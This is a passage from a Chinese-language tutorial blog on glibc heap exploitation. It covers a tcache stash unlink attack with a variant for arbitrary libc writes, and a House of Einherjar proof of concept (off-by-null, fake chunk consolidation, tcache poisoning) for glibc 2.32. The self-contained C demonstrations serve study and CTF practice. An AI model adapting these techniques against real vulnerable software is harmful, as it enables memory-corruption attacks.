class="comment">//申请大堆块</span></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x70</span>);				<span class="comment">//申请堆块，防止p1与top chunk合并</span></span><br><span class="line">	<span class="built_in">free</span>(p1);				<span class="comment">//p1进入unsorted bin</span></span><br><span class="line">	p1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span><span class="number">-0x70</span>);		<span class="comment">//切割剩下0x70大小</span></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);				<span class="comment">//将剩下的0x70大小的堆块放入smallbin中</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The small-bin now has a 0x70-length chunk!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* p2 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x70</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	p2 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span><span class="number">-0x70</span>);</span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The small-bin now has two 0x70-length chunks!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="comment">//此时smallbin中存在两个chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">long</span> heapbase = ((<span class="type">long</span>)p1&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>;</span><br><span class="line">	*(<span class="type">long</span>*)((<span class="type">char</span>*)p2+<span class="number">0x4a8</span>) = heapbase<span class="number">-0x10</span>;		<span class="comment">//修改第二个进入smallbin的chunk的bk位</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In smallbin the second chunk&#x27;s bk loc has been modified to %p!\n&quot;</span>, (<span class="type">long</span>*)*(<span class="type">long</span>*)((<span class="type">char</span>*)p2+<span class="number">0x4a8</span>));</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The target %p will be modified!\n&quot;</span>, (<span class="type">long</span>*)heapbase);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x60</span>);					<span class="comment">//申请一个smallbin中的chunk，并触发tcache_stash</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;attack success!\ntarget modified: %p\n&quot;</span>, (<span class="type">long</span> *)*(<span class="type">long</span>*)heapbase);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="PLUS"><a href="#PLUS" class="headerlink" title="PLUS"></a>PLUS</h3><p>plus实际上就是在上述攻击的基础上继续进行一次tcache stash，将伪造堆块放入tcache，后续直接申请该chunk，实现任意地址写。</p>
<p><strong>简单步骤：</strong>先向tcache中填入5个chunk，然后给smallbin放入2个与对应tcache大小一致的chunk，然后伪造第二个chunk的bk位为某一地址，该地址需要满足它的位置存储的地址可写，因为需要进行<code>bck-&gt;fd = bin;</code>，在calloc申请一次后，会将伪造的地址所指向的地址填充到tcache中，只需再malloc一次，即可申请到对应地址。</p>
<p><strong>简单POC：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)		<span class="comment">//填入tcache</span></span><br><span class="line">		<span class="built_in">free</span>(<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x60</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The 0x70-tcache has 5 chunks!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span>);		<span class="comment">//申请大堆块</span></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x70</span>);				<span class="comment">//申请堆块，防止p1与top chunk合并</span></span><br><span class="line">	<span class="built_in">free</span>(p1);				<span class="comment">//p1进入unsorted bin</span></span><br><span class="line">	p1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span><span class="number">-0x70</span>);		<span class="comment">//切割剩下0x70大小</span></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);				<span class="comment">//将剩下的0x70大小的堆块放入smallbin中</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The small-bin now has a 0x70-length chunk!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* p2 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x70</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	p2 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span><span class="number">-0x70</span>);</span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The small-bin now has two 0x70-length chunk!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="comment">//此时smallbin中存在两个chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">long</span> heapbase = ((<span class="type">long</span>)p1&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>;</span><br><span class="line">	<span class="type">long</span> main_arena = *(<span class="type">long</span>*)((<span class="type">char</span>*)p1+<span class="number">0x4a0</span>)<span class="number">-192</span>;</span><br><span class="line">	<span class="type">long</span> target = main_arena+<span class="number">0x70</span>;</span><br><span class="line">	*(<span class="type">long</span>*)((<span class="type">char</span>*)p2+<span class="number">0x4a8</span>) = target<span class="number">-0x10</span>;		<span class="comment">//修改第二个进入smallbin的chunk的bk位</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In smallbin the second chunk&#x27;s bk loc has been modified to %p!\n&quot;</span>, (<span class="type">long</span>*)*(<span class="type">long</span>*)((<span class="type">char</span>*)p2+<span class="number">0x4a8</span>));</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target %p will be modified!\n&quot;</span>, (<span class="type">long</span>*)target);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x60</span>);					<span class="comment">//申请一个smallbin中的chunk，并触发tcache_stash</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Attack success!\ntarget modified: %p\n&quot;</span>, (<span class="type">long</span> *)*(<span class="type">long</span>*)target);</span><br><span class="line">	<span class="type">long</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we can write memory in libc.\nGet address: %p.\n&quot;</span>, (<span class="type">long</span>*)p3);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-einherjar"><a href="#House-of-einherjar" class="headerlink" title="House of einherjar"></a>House of einherjar</h2><p>该方法比较简单，基本原理和chunk extend比较类似，但是威力十分强大。</p>
<p>基本利用方法为滥用<code>free()</code>函数的后向合并功能，我们只需要伪造待free的chunk的presize位以及<code>PREV_INUSE</code>即可，然后执行free。可以看看<code>how2heap</code>上的例子（本例版本为<code>libc-2.32</code>）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.32.</span></span><br><span class="line"><span class="comment">	 * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">	 * It has the additional requirement of a heap leak.</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">	 * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">	 * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">	 * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.10 64bit (glibc-2.32).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of einherjar attack by creating a chunk overlapping situation.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next, we use tcache poisoning to hijack control flow.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;Because of https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,&quot;</span></span><br><span class="line">		   <span class="string">&quot;now tcache poisoning requires a heap leak.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// prepare the target,</span></span><br><span class="line">	<span class="comment">// due to https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,</span></span><br><span class="line">	<span class="comment">// it must be properly aligned.</span></span><br><span class="line">	<span class="type">intptr_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">intptr_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// choose a properly aligned target address</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			target = &amp;stack_var[i];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	assert(target != <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">// prev_size (Not Used)</span></span><br><span class="line">	a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">	a[<span class="number">2</span>] = (<span class="type">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">	a[<span class="number">3</span>] = (<span class="type">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint8_t</span> *b = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint8_t</span> *c = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*) a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">	a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// tcache poisoning</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// requires a heap leak because it assumes the address of d is known.</span></span><br><span class="line">	<span class="comment">// since house of einherjar also requires a heap leak, we can simply just use it here.</span></span><br><span class="line">	d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>)target ^ ((<span class="type">long</span>)&amp;d[<span class="number">0x30</span>/<span class="number">8</span>] &gt;&gt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// take target out</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(e == target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们来简单梳理一下上述代码的攻击步骤：</p>
<ul>
<li>首先创建chunk_a，在自身堆块中伪造一个<code>presize=0, size=0x60</code>，并且<strong>fd和bk均指向伪造的fake_chunk</strong>（为了绕过unlink检测）。</li>
<li>再分配一个chunk_b，用来对后续堆块进行<code>off-by-null</code>写入，并为后续攻击做准备。</li>
<li>分配chunk_c，该堆块大小为<strong>0x100</strong>，是为了在<code>off-by-null</code>修改时只修改<code>PREV_INUSE</code>位，而不改变size，以绕过对size的检查。</li>
<li>计算<strong>chunk_c与fake_chunk的距离</strong>，并写入chunk_c的presize位。同时修改fake_chunk的size也为该值。</li>
<li>填满0x100大小的tcache，保证chunk_c会进入unsortedbin进行后向合并。</li>
<li>此时再释放chunk_c，与fake_chunk进行后向合并，分配一个较大堆块可以控制chunk_b内容，此时chunk_b还可以直接控制，在释放chunk_b之前，先释放一个pad，以供后续修改chunk_b的fd后申请到target绕过<code>tcache_count</code>.</li>
</ul>
<p>经典例题：2016 Seccon tinypad（ctf-wiki中可找到题目文件）</p>
<h2 id="IO-FILE-attack"><a href="#IO-FILE-attack" class="headerlink" title="IO_FILE attack"></a>IO_FILE attack</h2><h3 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a>IO结构体</h3><p><code>_IO_FILE_PLUS</code>定义：</p>
